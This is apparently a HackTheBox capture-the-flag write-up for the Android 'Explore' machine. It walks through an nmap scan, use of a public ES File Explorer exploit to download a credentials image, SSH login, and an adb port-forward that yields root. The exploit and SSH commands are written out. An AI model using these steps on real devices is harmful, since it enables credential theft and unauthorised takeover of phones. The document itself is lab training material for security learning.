## explore writeup

 This box is a mobile system, a phone and it was my first mobile box on HTB. It's not a complex box, but it's interesting.

1. first of all do nmap scan in this box.

`nmap -T4 -sCV -p- -oN explore 10.10.10.247`

the result will be this.
 ````bash
Nmap 7.91 scan initiated Fri Sep  3 20:32:32 2021 as: nmap -T4 -sCV -p- -oN explore 10.10.10.247
Warning: 10.10.10.247 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.247
Host is up (0.71s latency).
Not shown: 65485 closed ports, 46 filtered ports
PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
42135/tcp open  http    ES File Explorer Name Response httpd
42893/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 03 Sep 2021 15:24:51 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 03 Sep 2021 15:24:52 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 03 Sep 2021 15:24:58 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 03 Sep 2021 15:25:18 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 03 Sep 2021 15:24:59 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 03 Sep 2021 15:25:19 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 03 Sep 2021 15:25:22 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 03 Sep 2021 15:25:21 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=9/3%Time=61323A6F%P=x86_64-pc-linux-gnu%r(NUL
SF:L,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port42893-TCP:V=7.91%I=7%D=9/3%Time=61323A70%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x200
SF:3\x20Sep\x202021\x2015:24:51\x20GMT\r\nContent-Length:\x2022\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\x
SF:20Precondition\x20Failed\r\nDate:\x20Fri,\x2003\x20Sep\x202021\x2015:24
SF::52\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\.
SF:0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2003\x20Sep\x202021\x2
SF:015:24:58\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/plai
SF:n;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x20
SF:supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20Re
SF:quest\r\nDate:\x20Fri,\x2003\x20Sep\x202021\x2015:24:59\x20GMT\r\nConte
SF:nt-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\
SF:nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:\
SF:x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDat
SF:e:\x20Fri,\x2003\x20Sep\x202021\x2015:25:18\x20GMT\r\nContent-Length:\x
SF:2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:
SF:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq,
SF:DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2003\x20Sep\x2
SF:02021\x2015:25:19\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\x
SF:20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?\
SF:0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSer
SF:verCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2003
SF:\x20Sep\x202021\x2015:25:21\x20GMT\r\nContent-Length:\x2054\r\nContent-
SF:Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\
SF:nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mstsh
SF:ash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2003\x20Sep\x202021\x2015:25:22\x20GMT\r\nContent-Length:\
SF:x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0e
SF:\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Fri Sep  3 21:10:42 2021 -- 1 IP address (1 host up) scanned in 2289.50 seconds
````
according to the information presented by the scan, this is a phone.
researching about the identified services i found some interesting info.

`JSONAPI is a plugin for Bukkit that allows you to access data and other information about your server and your players through a simple, yet secure, HTTP API. This allows you to make awesome websites, iPhone apps, and a way for your players to purchase goods online and automatically receive them in game.`

02. Port 42135 is running a ES File Explorer this creates an HTTP service bound to port 59777 and doing a search you can find a public exploit (CVE-2019-6447).

![task 2](https://github.com/geeksniper/my-HackTheBox-writeup/blob/63a7303774413edb0262d1b8d9171b4e54e30c41/explore/explore-img/02.%20publicexploit-of-es-file-explorer.png)

03. Through this exploit I could read some files.

![task 3](https://github.com/geeksniper/my-HackTheBox-writeup/blob/4429ca790ee0c531c55c1f03459b70c67e8f26a6/explore/explore-img/03.%20using-exploit-list-files.png)

04. after that list pics and i got interesting .jpg file.

![task 4](https://github.com/geeksniper/my-HackTheBox-writeup/blob/4429ca790ee0c531c55c1f03459b70c67e8f26a6/explore/explore-img/04.%20list-pics.png)

05. now i download the file

````bash
python3 explorer-exploit.py listPics 10.10.10.247

python3 explorer-exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
````
![task 5](https://github.com/geeksniper/my-HackTheBox-writeup/blob/4429ca790ee0c531c55c1f03459b70c67e8f26a6/explore/explore-img/05.%20downlaod-jpg.png)

06. I open the .jpg file and This .jpg has notes looking like credentials.

![task 6](https://github.com/geeksniper/my-HackTheBox-writeup/blob/4429ca790ee0c531c55c1f03459b70c67e8f26a6/explore/explore-img/06.%20open-this-file-get-credential-of-ssh.png)

07. As enumerated before, the SSH service is running on port 2222 and using this credentials we were able to login successfully.

````bash
ssh kristi@10.10.10.247 -p 2222
````
![task 7](https://github.com/geeksniper/my-HackTheBox-writeup/blob/4429ca790ee0c531c55c1f03459b70c67e8f26a6/explore/explore-img/07.%20login-ssh-and-get-into-it.png)

08. Now I'm able to inside this machine and able to find the user flag at /sdcard.

![task 8](https://github.com/geeksniper/my-HackTheBox-writeup/blob/7fba83952b2898d596c7434f51be15892d389d8a/explore/explore-img/08.%20got-user-flag.png)

09. Looking for a way to own the Android system I found some things about Android Debug Bridge (adb) - a development tool that allows communication between an Android device and a computer as a shell.
As some documentations the adb opens a localport (as "system") 5555 and its possible to connect on it through USB setting the configured port, but is possible to bypass this "restriction" doing a portfoward to our machine, in this case, using SSH to do that.

```bash
ssh kristi@10.10.10.247 -L 5555:localhost:5555 -p 2222
````
![task 9](https://github.com/geeksniper/my-HackTheBox-writeup/blob/7fba83952b2898d596c7434f51be15892d389d8a/explore/explore-img/09.%20connect-with-local-port.png)

10. After insert password to stabilish connection the SSH shell starts, but in another terminal its possible to see the localhost port 5555 fowarded to our machine. With that, its possible to interage on this port and we will use adb to do that.adb is running with privileges so we can elevate our privilege to root.

![task 10](https://github.com/geeksniper/my-HackTheBox-writeup/blob/7fba83952b2898d596c7434f51be15892d389d8a/explore/explore-img/10.%20connect-with-adb-and-got-root-access.png)

11. And now as root I could found the root flag using find command to search it.

![task 11](https://github.com/geeksniper/my-HackTheBox-writeup/blob/0a9f5f5aa62688642d5c7b14b13e2762b94cd403/explore/explore-img/11.%20Got-root-flag.png)

## finished
